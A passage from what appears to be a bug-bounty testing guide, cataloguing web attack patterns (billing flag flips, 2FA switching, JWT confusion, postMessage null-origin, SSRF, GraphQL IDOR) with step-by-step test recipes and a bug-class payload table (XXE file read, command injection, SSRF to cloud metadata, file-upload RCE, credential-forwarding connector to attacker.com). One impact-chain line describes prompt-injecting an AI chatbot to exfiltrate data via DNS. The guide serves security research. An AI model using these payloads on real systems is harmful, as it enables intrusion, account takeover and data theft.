Frontend sent `activatePaidPlan: true` to server. Changed to `false` → server accepted → created 4th model on free plan. Backend trusted client-controlled billing parameter.

**Real example:**
- Free plan: max 3 models
- 4th model request: `{"activatePaidPlan": true}`
- Changed to `{"activatePaidPlan": false}` → server accepted
- No payment, no upgrade, premium functionality accessed

Test: "Does the client control billing parameters?"

```
1. Intercept request for premium feature
2. Look for billing/plan/subscription parameters
3. Flip boolean values (true↔false)
4. Change numeric values (0, 1, -1, 999)
5. Remove billing parameters entirely
```

**Key insight:** "One boolean parameter was enough to bypass an entire subscription workflow."

### 2.41 2FA Method Switching Bypass (The Authentication Flow Flaw)

Application allowed switching between Email OTP and TOTP during authentication challenge without verifying the current second factor. Attacker switches method → new QR code generated → scans it → logs in.

**Real examples:**
- Victim uses Email OTP → attacker switches to TOTP → new QR code → scans → logs in
- Victim uses TOTP → attacker switches to Email OTP → switches back → new QR code → scans → logs in

Test: "Can I switch 2FA methods mid-authentication?"

```
1. Start login with victim's credentials
2. Reach 2FA verification page
3. Switch authentication method
4. Does the app generate a new QR code/code?
5. Complete auth with new method
```

**Key insight:** "The authentication flow permitted modification of the second factor before the existing one had been validated."

### 2.42 HTTP Method Switch Token Leak (The Backend Routing Pattern)

GET and POST to the same endpoint hit different backends. POST exposed internal proxy headers including a Salesforce Bearer token. Token gave full org access: customer PII, employee directory, Apex source code, metadata.

**Real example:**
- GET → main application (security headers, CSP, HSTS)
- POST → internal backend (X-Forwarded-For, leaked Authorization header)
- Leaked token = Salesforce org token → full customer data, employee directory, source code

Test: "Do different HTTP methods hit different backends?"

```
1. Find endpoint in JS/traffic
2. Test GET → note response headers and body
3. Test POST → compare response headers
4. If different security headers → different backend
5. Check for leaked credentials in response headers
```

**Key insight:** "The GET path never touches that internal layer, so the token stays hidden. POST exposes it entirely."

### 2.43 Unauthenticated Profile Over-Exposure (The Data Leak Pattern)

Public profile endpoint returned 29KB of data without authentication: orders, payment info, naked media URLs, internal pricing, feature flags. Classic IDOR/mass assignment.

**Real example:**
- `GET /api/user/show/[username]` → no auth → 29KB response
- Included: orders, purchaser names, payment amounts, media URLs, internal config
- Unwatermarked video URLs accessible without authentication

Test: "What do public endpoints actually return?"

```
1. Find public profile/data endpoints
2. Send request WITHOUT authentication
3. Check full response body
4. Look for: orders, payments, media, internal config
5. Test if media URLs work without auth
```

**Key insight:** "Nobody broke down a gate here. Nobody picked a lock. I just read what the front door was already saying."

### 2.44 Malicious Shared Connector (The Supply Chain Trust Pattern)

Low-privileged user creates a shared connector pointing to attacker-controlled server. Admin interacts with connector → credentials forwarded to attacker → full admin access. User-generated content trusted in admin workflows.

**Real example:**
- Attacker creates connector with `"visibility": "shared_workspace"` pointing to `attacker.com`
- Admin opens connector → prompted for credentials → submits Bearer token
- Backend forwards token to attacker's server → admin compromised

Test: "Can low-priv users create shared integrations?"

```
1. Create a shared connector/integration as low-priv user
2. Point it to your controlled server
3. Wait for admin to interact with it
4. Capture any credentials/tokens forwarded
```

**Key insight:** "Unlike traditional phishing, the victim does not leave the platform. The platform backend itself forwards the credentials."

### 2.45 Static Reset Hash IDOR (The Permanent Token Pattern)

Password reset token was static, reusable, and exposed via IDOR endpoint. `/api/oneUser/{id}` returned user ID + reset hash. Same hash used in password recovery URL. Change ID → get hash → build recovery URL → ATO.

**Real example:**
- `GET /api/oneUser/6321` → returns `{id: 6321, hash: "a1b2c3..."}`
- Password recovery URL: `/password-recovery/6321/a1b2c3...`
- Change ID to victim's → get their hash → reset their password
- `GET /api/oneUser/1` → administrator account

Test: "Is the reset token static and exposed?"

```
1. Request password reset → note the recovery URL
2. Request again → same URL? (static token)
3. Search for endpoints that return user data
4. Does any endpoint return the reset hash?
5. Can you enumerate user IDs?
```

**Key insight:** "Password reset tokens should be random, temporary, single-use. This token was static, reusable, publicly accessible."

### 2.46 JWT Attack Classes (The Hostile Input Language Pattern)

JWT is not just a token format — it's a hostile input language for verifiers. The decisive question: what does the token get to influence before trust has been established?

**Attack classes:**
- **Algorithm confusion**: RSA public key reinterpreted as HMAC secret (`alg: HS256` with RSA key)
- **kid injection**: `kid` parameter spliced into SQL/filesystem path
- **jwk abuse**: Self-supplied public key in header → verifier validates against attacker key
- **jku abuse**: Header points to attacker-controlled key server
- **Cross-token substitution**: Valid token for one purpose replayed into another
- **ECDH-ES invalid curve**: Attacker-influenced ephemeral public key → invalid curve attack
- **RSA1_5 oracle**: Bleichenbacher-style oracle against PKCS#1 v1.5 encryption

Test: "Does the verifier trust attacker-controlled token metadata?"

```
1. Decode JWT → inspect header parameters
2. Test alg switching: RS256→HS256, RS256→none
3. Test kid injection: path traversal, SQL injection
4. Test jwk: embed own public key in header
5. Test jku: point to your own key server
6. Check if signature is verified before policy checks
```

**Key insight:** "The mistake is permitting the unauthenticated header to participate in trust negotiation."

### 2.47 Loose Regex File Upload → RCE (The Missing Anchor Pattern)

Regex `/\.pdf/i` missing `$` anchor → `shell.pdf.php` passes validation → uploaded to web-accessible directory → PHP executes → RCE. $12,000 bounty.

**Real example:**
- File upload restricts to `.pdf` files
- Regex: `/\.pdf/i` (no `$` anchor)
- `shell.pdf.php` → contains `.pdf` → passes validation
- Apache/PHP evaluates by final extension → executes as PHP

Test: "Can I bypass file upload regex with double extensions?"

```
1. Identify allowed extension (e.g., .pdf)
2. Try: shell.pdf.php, shell.php.pdf, shell.pdphp
3. Try: shell.php%00.pdf, shell.php\x00.pdf
4. Check if file is saved with original filename
5. Check if web-accessible directory executes scripts
```

**Key insight:** "Always anchor your patterns (`$` for end of string). Randomize uploaded filenames. Store on isolated storage."

### 2.48 SSRF to Credentials Chain (The Trust Chain Pattern)

Initial SSRF rejected as out of scope → researcher persisted → SSRF reached internal config files → leaked credentials → authenticated access to production infrastructure.

**Real example:**
- SSRF on out-of-scope asset → initially rejected
- SSRF reached internal config files → leaked cloud credentials
- Credentials worked on internal production services
- Unauthenticated SSRF → authenticated attack chain

Test: "What does the SSRF actually reach?"

```
1. Map internal resources reachable via SSRF
2. Look for: config files, metadata endpoints, credential stores
3. Check for: AWS metadata (169.254.169.254), Azure IMDS, GCP metadata
4. If credentials found → test on internal services
5. Follow the trust chain: app → config → credentials → backend
```

**Key insight:** "An SSRF is rarely just an SSRF. The first bug is often only the entry point to a much larger story."

### 2.49 IDOR → Cloud Storage Leak (The Infrastructure Blueprint Pattern)

Translation API with `translationKeyGroupId` parameter → IDOR enumeration → bypassed 403 → response contained hardcoded S3 URL → public S3 bucket → 300K+ customer records.

**Real example:**
- `GET /path?language=en&translationKeyGroupId=1` → 200 OK
- `translationKeyGroupId=2` → 403 Forbidden
- `translationKeyGroupId=3` → 200 OK (bypass)
- Response contained hardcoded S3 URL → public bucket → 300K+ PII

Test: "Do API responses leak infrastructure URLs?"

```
1. Enumerate ID parameters (increment, decrement)
2. Check all responses for: S3 URLs, Azure blob URLs, internal hosts
3. Look for: hardcoded credentials, API keys, storage URLs
4. Test if leaked storage URLs are publicly accessible
5. Check for: OAuth configs, error codes, test artifacts
```

**Key insight:** "Even when an asset sits on a boundary line between a provider and a customer, it is the responsibility of the collective security community to ensure the doors to sensitive data remain firmly shut."

---

### 2.50 postMessage Origin Bypass (The Sandbox Null Origin Pattern)

A sandboxed iframe has origin `null`. The origin validation function `b.isSameOrigin(a)` checked if the untrusted origin matched the trusted one, but when the untrusted origin was `null`, all protocol/domain/port checks passed (since `null` has none), and the final string comparison `b.toString() === ""` returned `false` because `"null" !== ""`. This allowed a sandboxed iframe to bypass origin checks and receive a MessageChannel port, granting trusted communication access.

**Real example ($66,000 Meta):**
- `h(a.origin)` checked if origin was allowed: `b.isSameOrigin(a)` where `b` = untrusted origin, `a` = trusted origin
- When `a.origin = "null"` (sandboxed iframe), `b.isSameOrigin(a)` returned `true` because `null` had no protocol/domain/port
- Attacker received MessageChannel port → could send `{compatAction:"request-loaddialog"}` → parent sent OAuth dialog URL containing `cquick_token` and `state`
- Leaked `state` was the callback function name for receiving access_token → attacker hijacked first-party token

Test: "Can I bypass postMessage origin checks with sandboxed iframes?"

```
1. Embed target in sandboxed iframe: `<iframe sandbox="allow-scripts" src="target">`
2. Send postMessage from sandboxed context (origin will be "null")
3. Check if target accepts messages from "null" origin
4. If accepted, check if MessageChannel ports or sensitive data are shared
```

**Specific tests:**
- Test `isSameOrigin` implementation direction: Does it check `trusted.isSameOrigin(untrusted)` or `untrusted.isSameOrigin(trusted)`? The latter is vulnerable to null origin.
- Check for origin checks that only validate protocol/domain/port without handling `null` specially
- Test `ALLOW-FROM` in X-Frame-Options: Modern browsers don't support it, effectively disabling frame protection
- Test `cquick=1&cquick_token=TOKEN&ctarget=DOMAIN` compat parameters for forcing cross-origin embedding
- **Key**: The correct check is `trustedDomain.isSameOrigin(untrustedOrigin)`, not the reverse.

### 2.51 PRNG State Recovery (The Math.random() Pattern)

`Math.random()` is a non-cryptographic PRNG. When used to generate security-critical values (callback identifiers, tokens, nonces), its predictable state can be reconstructed from observed outputs, allowing prediction of future values.

**Real example ($66,000 Meta):**
- Facebook JS SDK used `Math.random()` for callback identifiers protecting postMessage communication
- `guid()` returned `"f" + (Math.random() * (1 << 30)).toString(16).replace(".", "")`
- Same PRNG instance generated both iframe names AND callback identifiers
- Attacker could observe iframe names via `window.frames[0].frames[0].name` (PRNG output leakage)
- Forced reinitialization via `init:post` event to generate more outputs
- Used Z3 solver to reconstruct PRNG state from non-consecutive outputs
- Predicted next callback identifier → forged valid postMessage → DOM XSS

Test: "Is a non-cryptographic PRNG used for security-critical values?"

```
1. Identify how random values are generated (Math.random(), simple LCG, etc.)
2. Check if outputs can be observed (iframe names, tokens in URLs, timing)
3. Force multiple value generations via reinitialization/reloading
4. Collect observed outputs and reconstruct PRNG state (Z3, symbolic execution)
5. Predict future values and forge security tokens
```

**Specific tests:**
- Search for `Math.random()` in JS SDKs, authentication libraries
- Check if iframe names, callback IDs, CSRF tokens are derived from `Math.random()`
- Test forced reinitialization: Can you trigger regeneration of values without full reload?
- Check if sequential outputs from the same PRNG instance are used for different purposes
- **Key**: Never use `Math.random()` for security. Always use `crypto.getRandomValues()`.

### 2.52 Parameter Pollution (The Array Index Injection Pattern)

Server-side parameter parsing may treat `param[0` as replacing `param` entirely, even when client-side deduplication removes duplicates. This creates a desync between client and server validation.

**Real example ($42,000 Facebook):**
- Client-side `PlatformAppController` deduplicated `redirect_uri` parameters
- Server-side accepted `redirect_uri[0` as replacing `redirect_uri`
- Attacker set `redirect_uri` to attacker domain (for client-side validation) and `redirect_uri[0` to legitimate domain (for server-side validation)
- Server accepted legitimate redirect_uri[0] → issued access_token → sent to attacker's origin
- First-party token stolen via parameter pollution

Test: "Can I pollute parameters with array-index syntax?"

```
For each URL-encoded POST body:
1. Identify parameters checked client-side
2. Add `param[0`, `param[1`, `param[]` variants of the same parameter
3. Set original to attacker value, indexed variant to legitimate value
4. Check if server-side uses the indexed variant while client-side uses the original
```

**Specific tests:**
- `redirect_uri[0` replacing `redirect_uri` in OAuth flows
- `amount[0` replacing `amount` in payment requests
- `user_id[0` replacing `user_id` in authorization checks
- Test bracket-encoded variants: `%5B0%5D`, `%5B%5D`, `[random`
- **Key**: Client-side and server-side parameter parsing must be identical.

### 2.53 URI Path Injection (The Version Parameter Hijack Pattern)

When a `version` parameter is concatenated into a URI path without validation, attackers can inject path traversal or entirely different endpoints.

**Real example ($42,000 Facebook):**
- `PlatformDialogClient.getURI()` set version before `/dialog/oauth`
- `version` parameter not sanitized for dots or extra paths
- Attacker set `version` to `api/graphql?doc_id=DOC_ID&variables=VAR#`
- POST request sent to `/api/graphql?doc_id=DOC_ID&variables=VAR&/dialog/oauth`
- GraphQL mutation executed with user's CSRF token via the dialog endpoint
- Arbitrary GraphQL mutations executed (e.g., add phone number, change email)

Test: "Can I inject paths via the version parameter?"

```
For each API with version parameter:
1. Set version to `api/graphql?doc_id=X&variables=Y#`
2. Set version to `../admin/` for path traversal
3. Set version to `//attacker.com/` for protocol-relative URL hijacking
4. Check if request hits a different endpoint than intended
```

**Specific tests:**
- Version parameter with query strings and fragments
- Double-dot path traversal in version fields
- Protocol-relative URLs (`//evil.com/endpoint`)
- Null bytes or encoding to bypass path validation
- **Key**: Version parameters must be whitelisted, not concatenated directly.

### 2.54 HTML-to-PDF Converter Abuse (The Server-Side Rendering Pattern)

HTML-to-PDF converters render attacker-controlled HTML in a server-side browser context. This creates SSRF, LFI, and RCE opportunities.

**Real example ($1,000 Facebook - 3rd party):**
- Input was HTML-encoded client-side but decoded server-side before PDF conversion
- `<iframe src="file:///etc/passwd">` rendered in PDF → local file read
- `<iframe src="http://internal-ip:port">` used for internal network scanning
- Open ports showed rendered content; closed ports showed error → distinguishable in PDF
- `about://` URL leaked IE version and preferences
- PDF converter ran in IE context → IE exploits embedded in HTML executed

Test: "Can I abuse the PDF converter?"

```
1. Find endpoints that generate PDFs from user input
2. Check if HTML is sanitized client-side but decoded server-side
3. Test URL schemes: file://, http://, about://, data://, javascript://
4. Embed iframes pointing to internal IPs/ports
5. Check if PDF reveals internal network topology
6. Test for IE-specific vulnerabilities if converter uses IE/Edge
```

**Specific tests:**
- `file:///etc/passwd`, `file:///C:/windows/win.ini`
- `file:///proc/self/environ` for Linux environment variables
- Internal IP scanning via iframe src (192.168.1.1, 10.0.0.1)
- `about:config`, `about:version` for browser info leakage
- CSS `@font-face` with `unicode-range` for character-by-character exfiltration
- **Key**: PDF converters are browsers. Treat them as such.

### 2.55 CSRF Proxy Endpoint (The Token Injection Pattern)

Some endpoints act as proxies: they receive a target URL, automatically inject the user's CSRF token, and forward the request. This allows CSRF attacks against any internal endpoint.

**Real example (Facebook):**
- `https://www.facebook.com/comet/dialog_DONOTUSE/?url=XXXX` took any endpoint URL
- Automatically added `fb_dtsg` CSRF token to POST body
- Forwarded to arbitrary GraphQL mutations, profile actions, deletion endpoints
- Could make posts, delete profile pictures, trigger account deletion dialogs

Test: "Is there a proxy endpoint that injects CSRF tokens?"

```
1. Search for endpoints with names like dialog_DONOTUSE, proxy, forward, bridge
2. Test if they accept arbitrary URLs in a parameter
3. Check if CSRF token is automatically added to forwarded requests
4. Test forwarding to sensitive endpoints: delete, modify, escalate
```

**Specific tests:**
- Proxy endpoints in `/comet/`, `/api/`, `/dialog/`
- Parameters named `url`, `href`, `target`, `redirect`, `endpoint`
- Check if the proxy enforces URL whitelist or allows any domain/path
- Test with internal-only endpoints that normally require manual confirmation
- **Key**: Proxy endpoints must validate target URLs against a strict whitelist.

### 2.56 MessageChannel Port Trust Abuse (The Comet Compat Pattern)

MessageChannel ports shared between windows bypass further origin checks once established. If the initial origin validation is flawed, all subsequent messages through the port are trusted.

**Real example (Meta Canvas):**
- `CometCompatBroker` verified origin before accepting MessageChannel port
- Origin check `h(a.origin)` was bypassable via sandboxed iframe (see 2.50)
- Once port was accepted, all messages through it were trusted without further origin checks
- Attacker sent `{compatAction:"request-loaddialog"}` → received OAuth dialog URL
- Dialog URL contained `cquick_token` and `state` → leaked first-party credentials

Test: "Can I abuse MessageChannel port sharing?"

```
1. Find where MessageChannel ports are shared between windows/iframes
2. Check initial origin validation before accepting the port
3. Test if messages through the port skip subsequent origin checks
4. Check if sensitive data (tokens, URLs) is sent through the port
```

**Specific tests:**
- Search for `MessageChannel`, `postMessage` with ports in JS code
- Test initial origin validation with null origin, spoofed origin
- Check if port messages trigger sensitive actions (dialog loading, token exchange)
- **Key**: Once a port is shared, it's a permanent trust boundary. Validate the origin rigorously.

### 2.57 Iframe Reinitialization Abuse (The init:post Pattern)

Some applications reinitialize iframes or plugins in response to messages. This can be abused to force regeneration of values, leak state, or create race conditions.

**Real example ($66,000 Meta):**
- Facebook SDK listened for `init:post` messages with `xfbml: true`
- On receiving this, SDK re-parsed all XFBML plugins → destroyed and recreated iframes
- Each recreation generated new iframe names via `guid()` → leaked new PRNG outputs
- Attacker repeatedly sent `init:post` → collected multiple PRNG outputs → reconstructed state

Test: "Can I force reinitialization of iframes or plugins?"

```
1. Search for event listeners that trigger reinitialization (init:post, xfbml, parse, reload)
2. Check if reinitialization regenerates tokens, IDs, or iframe names
3. Send reinitialization messages repeatedly to collect multiple outputs
4. Check if reinitialization creates race conditions (old iframe still processing while new one created)
```

**Specific tests:**
- `postMessage({xfbml: true}, "*")` to Facebook SDK iframes
- Search JS for `.parse()`, `.reload()`, `.init()` triggered by messages
- Check if reinitialization leaks new random values via iframe names, IDs, or URLs
- **Key**: Reinitialization should not expose new random values or create windows for race conditions.

### 2.58 Origin Registration Abuse (The xdArbiterRegister Pattern)

Some systems allow iframes to register their origin dynamically. If the registration check is weak, an attacker can register an arbitrary origin and use it for subsequent trusted communication.

**Real example ($42,000 Facebook):**
- `xdArbiterRegister` allowed iframes to register their origin
- Registered origin was checked via `/platform/app_owned_url_check/`
- But subsequent messages could omit origin entirely → used previously registered origin
- Attacker registered `attacker.com` → sent messages without origin → messages treated as from attacker.com
- Allowed bypassing redirect_uri validation for first-party tokens

Test: "Can I register arbitrary origins for trusted communication?"

```
1. Look for origin registration endpoints or postMessage handlers
2. Check what validation is performed during registration
3. Register a legitimate-looking origin
4. Send subsequent messages without origin → check if previously registered origin is used
5. Check if registration is persistent across page reloads or sessions
```

**Specific tests:**
- `xdArbiterRegister`, `registerOrigin`, `originRegister` in JS
- Test if registration validates domain ownership (DNS, callback, file upload)
- Check if registration is scoped to app_id or global
- **Key**: Origin registration must validate domain ownership and scope it to the requesting application.

### 2.59 Login/Logout CSRF Chain (The Session Swap Pattern)

Chaining login CSRF and logout CSRF allows an attacker to switch a victim's session while keeping sensitive page state loaded in an iframe.

**Real example ($66,000 Meta):**
- Attacker loaded OAuth dialog in iframe → victim logged in
- Attacker performed logout CSRF → victim logged out
- Attacker performed login CSRF into attacker's account → victim now logged in as attacker
- OAuth dialog iframe did NOT refresh on session change → still contained victim's OAuth code
- Attacker accessed victim's OAuth code from same-origin iframe → account takeover

Test: "Can I chain login/logout CSRF while keeping sensitive iframes loaded?"

```
1. Load a sensitive page in an iframe (OAuth dialog, payment form)
2. Perform logout CSRF on victim
3. Perform login CSRF into attacker's account
4. Check if the sensitive iframe refreshes or detects session change
5. If not, access the iframe content → steal tokens, codes, or data
```

**Specific tests:**
- Test if OAuth dialogs refresh when session changes
- Test if payment forms detect session changes
- Test if iframe content is accessible after session swap
- Check for `cquick_token` parameters that allow framing otherwise unframeable pages
- **Key**: Sensitive dialogs must invalidate their content on session change.

### 2.60 postMessage Arbitrary Origin Injection (The Feedback Plugin Pattern)

Some plugin endpoints accept callback parameters that get reflected in postMessage responses, allowing an attacker to inject arbitrary messages from a trusted origin.

**Real example ($66,000 Meta):**
- `https://www.facebook.com/plugins/feedback.php` accepted `channel_url` parameter
- Plugin sent postMessage to parent window with attacker-controlled payload in `cb` parameter
- Message originated from `www.facebook.com` → passed origin check
- Attacker controlled the payload → could trigger any SDK event handler
- Used to send `init:post` with `xfbml: true` → forced plugin reinitialization

Test: "Can I inject postMessage payloads via plugin endpoints?"

```
1. Find plugin endpoints that accept callback/channel URL parameters
2. Check if the endpoint sends postMessage with attacker-controlled data
3. Verify the message originates from a trusted domain
4. Check if the payload can trigger arbitrary event handlers in the SDK
```

**Specific tests:**
- `feedback.php`, `customerchat.php`, `comments.php` with `channel_url`, `cb`, `callback`
- Test URL-encoded injection in callback parameters
- Check if the payload format is validated (JSON, RPC, etc.)
- **Key**: Plugin callbacks must validate payload structure, not just origin.

---

## Phase 3: GraphQL/API Deep Testing

Most accepted bugs were in GraphQL or API endpoints.

### 3.1 GraphQL-Specific Tests

**Mutation Testing:**
```graphql
# Test 1: Omit required fields
mutation { cartLinesAdd(cartId: "X", lines: []) { cart { id } } }

# Test 2: Add extra fields (MANSCAPED pattern)
mutation { cartLinesAdd(cartId: "X", lines: [{merchandiseId: "Y", sellingPlanId: null}]) { cart { id } } }

# Test 3: Modify computed values
mutation { updateOrder(orderId: "X", total: 0) { id } }

# Test 4: Access other users' data (Airbnb pattern)
mutation { getOrder(orderId: "OTHER_USER_ORDER_ID") { id items { name } } }

# Test 5: Bypass UI restrictions (Airbnb infant pattern)
mutation { stayCheckout(listingId: "X", guestCounts: {numberOfInfants: 99}) { id } }
```

**Introspection Testing:**
```graphql
# Dump the entire schema
{ __schema { types { name fields { name type { name } } } } }

# Find hidden mutations
{ __schema { mutationType { fields { name args { name type { name } } } } } }
```

**IDOR Testing (Airbnb Passport Stamps):**
```graphql
# Encode user ID: base64("User:12345") = "VXNlcjoxMjM0NQ=="
# Query other users' private data
query { user(userId: "VXNlcjoxMjM0NQ==") { aggregatedPastLocations { edges { node { stamp { localizedLocation } } } } } }
```

**GraphQL BOLA / Nested Resolver Abuse:**
```graphql
# Parent resolver validates ownership, child resolver does not
query { 
  me { 
    organization(id: "ATTACKER_ORG") {  # validated
      users {                           # NOT validated
        email
        ssn
      }
    }
  }
}
```

**GraphQL Batch Attack:**
```graphql
# Query multiple users in one request to bypass rate limits
query {
  user1: user(id: "1") { email }
  user2: user(id: "2") { email }
  user3: user(id: "3") { email }
  # ... up to hundreds
}
```

**GraphQL SSRF via Arguments:**
```graphql
# User-controlled URL in mutation argument
mutation {
  importData(url: "http://169.254.169.254/latest/user-data") {
    status
  }
}
```

### 3.2 API Parameter Tampering

For each intercepted request:
```
1. Change IDs: increment, decrement, swap between objects
2. Change quantities: negative, zero, overflow, float
3. Change prices: if client sends price, does server recalculate?
4. Change roles: if request includes role, can I escalate?
5. Change timestamps: can I access future/past data?
6. Change states: can I skip required states?
7. Change guest counts: does server validate against policy?
8. Change booleans: flip true↔false on billing/feature flags
9. Change arrays: add unexpected elements, duplicate entries
10. Change nulls: replace null with object/array/string
```

### 3.3 Response Analysis

Don't just check status codes. Check:
- Does the response contain data I shouldn't see?
- Does the error message reveal internals?
- Does the response differ when I'm authenticated vs not?
- Does the response differ with different roles?
- **Do response flags control UI behavior?** (UiPath pattern: flip false→true)
- **Do responses leak infrastructure URLs?** (S3, Azure Blob, internal hosts)
- **Do responses contain sequential IDs?** (brute-force for bulk exfil)

---

## Phase 4: Impact Escalation

A finding without impact is noise. Chain primitives into impact.

### 4.1 The Chain Pattern

Single primitive → + Context → = Impact

```
Primitive: I can read any user's order
Context: Orders contain email, address, phone
Impact: PII exposure affecting all users

Primitive: I can modify cart after checkout
Context: Price is calculated at checkout
Impact: Buy anything for $0.01

Primitive: I can predict OAuth state
Context: Integration trusts the state parameter
Impact: Cross-tenant code execution via supply chain

Primitive: I can send concurrent checkout requests
Context: Points are checked but not locked atomically
Impact: Redeem loyalty points unlimited times

Primitive: I can set session ID to any value
Context: Each unique SID = new cart, coupons not tied to account
Impact: Unlimited single-use coupon reuse

Primitive: I can inject a prompt into AI chatbot
Context: AI has DNS lookup tool + access to promo codes
Impact: Exfiltration of confidential data via DNS

Primitive: I can upload a PDF
Context: Regex lacks `$` anchor, file stored in web dir
Impact: RCE via double extension ($12,000)

Primitive: I can hit internal metadata endpoint
Context: AWS metadata returns IAM credentials
Impact: Full cloud environment takeover

Primitive: I can race OAuth token exchange
Context: Code not checked for single-use atomically
Impact: Admin token hijacking ($8,500)
```

### 4.2 Impact Categories

Map your finding to impact:
- **Financial**: Can the attacker get money/goods without paying? (Zooplus coupons, Tesco stock)
- **Data**: Can the attacker read data they shouldn't? (Airbnb passport stamps)
- **Integrity**: Can the attacker modify data they shouldn't? (UiPath plan flags)
- **Availability**: Can the attacker break functionality?
- **Trust**: Can the attacker abuse trust relationships? (UiPath OAuth, supply chain)
- **Safety**: Can the attacker bypass safety limits? (Airbnb infant count)
- **Supply Chain**: Can the attacker compromise downstream consumers?
- **Cloud**: Can the attacker escalate from app to infrastructure?
- **AI/LLM**: Can the attacker manipulate AI systems to cause harm?

### 4.3 Write the Report

Structure your report around the BUSINESS LOGIC failure:

```markdown
## Summary
[One sentence: what business rule is broken]

## Business Context
[Why this rule exists: "VIP pricing requires subscription to fund X"]

## Technical Details
[How the rule is enforced vs how it's bypassed]

## Steps to Reproduce
[Exact steps, including the business context]

## Impact
[Business impact, not just "attacker can do X"]

## Suggested Fix
[How to fix the BUSINESS LOGIC, not just the technical issue]
```

---

## Phase 5: Verifier Pressure (Kill Bad Leads Early)

### 5.1 Pre-Submission Checklist

Before writing a report, verify:
- [ ] Is this a business logic flaw, not just a technical finding?
- [ ] Can I demonstrate real impact (financial, data, trust)?
- [ ] Is this reproducible without complex setup?
- [ ] Is this within scope?
- [ ] Is this not a duplicate? (Search HackerOne, BugCrowd, Google)
- [ ] Would a non-security person understand why this matters?
- [ ] Have I tested the fix scenario? (Does the fix actually work?)
- [ ] Can I chain this with another finding for higher impact?

### 5.2 Severity Self-Assessment

Be honest:
- **Critical**: Direct financial loss, RCE, full account takeover, mass data breach
- **High**: Significant business logic bypass, data exposure, privilege escalation
- **Medium**: Limited impact, requires specific conditions, single-user impact
- **Low**: Edge case, minimal impact, defense-in-depth, information disclosure only

### 5.3 Kill Criteria

Kill the finding if:
- It's a scanner false positive
- It requires impossible preconditions
- The impact is theoretical only
- It's a duplicate of known behavior
- The program explicitly excludes it
- You can't reproduce it consistently
- The fix is trivial and already deployed

---

## The 80 Bug Classes (From 11,158+ HackerOne Reports + Accepted Reports + ysamm.com)

### Classification Taxonomy (Root-Cause Based)

**Injection Flaws:**
| # | Class | Example | Key Test | Avg Bounty |
|---|-------|---------|----------|------------|
| 1 | **Cross-Site Scripting (XSS)** | Stored/reflected/DOM XSS via input fields | Inject `<script>alert(1)</script>` in all inputs | $500–$3,000 |
| 2 | **SQL Injection** | Union-based, blind, time-based | Add `'` and observe errors; test `OR 1=1` | $1,000–$5,000 |
| 3 | **Command Injection** | OS command injection in file processing | `; id #` in filename parameters | $2,000–$8,000 |
| 4 | **Code Injection** | PHP eval(), Python exec() | `${system('id')}` in template context | $2,000–$10,000 |
| 5 | **CRLF Injection** | HTTP response splitting | `%0d%0aSet-Cookie:` in URL parameters | $500–$2,000 |
| 6 | **Server-Side Template Injection (SSTI)** | Jinja2, Twig, ERB | `${7*7}` → if evaluated, SSTI confirmed | $2,000–$8,000 |
| 7 | **XML External Entity (XXE)** | Billion laughs, file read | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | $1,000–$5,000 |
| 8 | **GraphQL Injection** | Introspection abuse, nested resolver IDOR | Query `__schema` for hidden fields | $1,000–$5,000 |
| 9 | **LDAP Injection** | Auth bypass via LDAP filters | `*)(uid=*))(&(uid=*` in login fields | $1,000–$3,000 |
| 10 | **XPath Injection** | XML document traversal | `'] | //* | //*['` in XML queries | $500–$2,000 |
| 11 | **NoSQL Injection** | MongoDB operator injection | `{"$gt": ""}` in JSON login | $1,000–$4,000 |
| 12 | **JSON Injection** | Parser differential | `{"role": "admin "}` null byte injection | $500–$2,000 |
| 13 | **HTML Injection** | Content spoofing, phishing | `<iframe src=evil.com>` in profile fields | $300–$1,000 |
| 14 | **CSV Injection** | Formula injection | `=cmd|' /C calc'!A0` in CSV export | $500–$2,000 |
| 15 | **PDF Injection** | Malicious PDF actions | JavaScript actions in PDF upload | $500–$2,000 |

**Authorization & Access Control:**
| # | Class | Example | Key Test | Avg Bounty |
|---|-------|---------|----------|------------|
| 16 | **IDOR** | Change user ID in API call | Increment/decrement IDs; swap between objects | $500–$6,000 |
| 17 | **Broken Object Level Authorization (BOLA)** | Access other users' data via API | Test nested resolvers; try different object IDs | $1,000–$5,000 |
| 18 | **Broken Function Level Authorization (BFLA)** | Access admin functions as regular user | Test all HTTP methods on endpoints; try `/admin/` paths | $1,000–$5,000 |
| 19 | **Improper Access Control** | Missing authorization checks | Access endpoints without auth; test role boundaries | $500–$3,000 |
| 20 | **Privilege Escalation** | User → Admin via parameter tampering | Modify `role`, `isAdmin`, `tier` in requests | $1,000–$5,000 |
| 21 | **Authorization Bypass** | Direct endpoint access without permission | Call endpoints with different session/role tokens | $1,000–$5,000 |
| 22 | **Authentication Bypass** | Login without credentials | Test for missing auth checks; try null passwords | $2,000–$10,000 |
| 23 | **Session Management** | Session fixation, insufficient expiration | Test session persistence after logout/password change | $500–$3,000 |
| 24 | **JWT Attacks** | Algorithm confusion, kid injection | Switch `alg: RS256` → `HS256`; test `alg: none` | $1,000–$5,000 |
| 25 | **OAuth/SSO Attacks** | State prediction, redirect_uri manipulation | Predict state parameter; test redirect_uri whitelist | $1,000–$7,500 |
| 26 | **MFA Bypass** | 2FA method switching, brute force | Switch 2FA methods mid-auth; test rate limits on OTP | $1,000–$5,000 |
| 27 | **CSRF** | Cross-site request forgery | Test if state-changing actions require tokens | $300–$1,500 |
| 28 | **Password Reset Abuse** | Token prediction, null token | Set token to null; test token expiration | $500–$3,000 |
| 29 | **Account Takeover (ATO)** | Session hijacking, credential stuffing | Test session fixation; test for leaked tokens | $2,000–$10,000 |

**Server-Side & Infrastructure:**
| # | Class | Example | Key Test | Avg Bounty |
|---|-------|---------|----------|------------|
| 30 | **Server-Side Request Forgery (SSRF)** | Cloud metadata access | `http://169.254.169.254/latest/user-data` | $3,000–$15,000+ |
| 31 | **HTTP Request Smuggling** | CL.TE, TE.CL desync | Test with different Content-Length/Transfer-Encoding | $2,000–$8,000 |
| 32 | **Cache Poisoning** | Web cache deception | Test cache behavior with different headers/paths | $1,000–$5,000 |
| 33 | **Denial of Service** | Resource exhaustion | Send oversized payloads; test rate limits | $500–$2,000 |
| 34 | **Memory Corruption** | Buffer overflow, heap overflow | Fuzz with oversized inputs; test binary protocols | $1,000–$5,000 |
| 35 | **Use After Free** | UAF in native code | Trigger object destruction then reuse | $2,000–$10,000 |
| 36 | **Integer Overflow** | Numeric boundary abuse | Send max_int, negative values, zero | $500–$3,000 |
| 37 | **Path Traversal** | LFI/RFI | `../../../etc/passwd` in file parameters | $500–$3,000 |
